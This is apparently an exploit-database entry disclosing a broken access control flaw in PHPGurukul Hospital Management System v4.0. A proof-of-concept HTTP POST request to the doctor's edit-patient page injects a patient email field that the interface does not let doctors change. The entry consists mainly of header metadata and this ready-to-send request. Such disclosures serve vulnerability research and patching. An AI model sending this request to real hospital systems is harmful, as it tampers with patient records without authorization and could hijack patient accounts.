# Exploit Title: Hospital Management System v4.0 - Broken Object Property Level Authorization(BOPLA)
## Date: 1/4/2024
## Vendor Homepage: https://phpgurukul.com/hospital-management-system-in-php
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Phpgurukul
## Version: v4.0
## Exploit Description:
## Hospital Management System v4.0 suffers from BOPLA - Broken Access Control Vulnerability allowing attacker doctor to update the email of patient that cannot modify in UI.

## ---------------------------------POC-----------------------------
```
POST /hospital/hms/doctor/edit-patient.php?editid=2 HTTP/1.1
...

patname=user1p&patcontact=111112&patemail=user1p%40test.com(CHANGE HERE)&gender=Male&pataddress=bbb&patage=20&medhis=0&submit=
```